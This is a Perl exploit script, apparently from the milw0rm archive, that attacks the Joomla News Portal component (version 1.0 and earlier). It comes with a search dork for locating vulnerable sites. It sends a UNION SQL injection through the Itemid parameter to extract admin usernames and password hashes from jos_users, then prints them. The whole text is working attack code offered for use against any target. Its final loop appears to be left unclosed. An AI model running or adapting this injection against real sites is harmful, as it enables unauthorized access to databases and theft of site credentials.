#!/usr/bin/perl
#[[Script Name: Joomla Component News Portal <= 1.0 Blind SQL Injection Exploit
#[[Coded by   : MEFISTO
#[[Author     : ilker Kandemir
#[[Dork       : "index.php?option=com_news_portal" or "Powered by iJoomla News Portal"

use IO::Socket;
if(@ARGV < 1){
print "
[[========================================================================
[[//   Joomla Component News Portal <= 1.0 Blind SQL Injection Exploit
[[//                   Usage: cnp.pl [target]
[[//                   Example: cnp.pl victim.com
[[//                   Vuln&Exp : iLker Kandemir a.k.a MEFISTO
[[//                   website  : www.dumenci.net -
[[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/index.php?option=com_news_portal&Itemid=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
 }


$target = "-1%20union%20select%20111,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),333%20from%20jos_users/*";
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /username:(.*?)pass/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /password:(.*?)border/){
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) {
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit();
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit();
}

# milw0rm.com [2008-06-09]
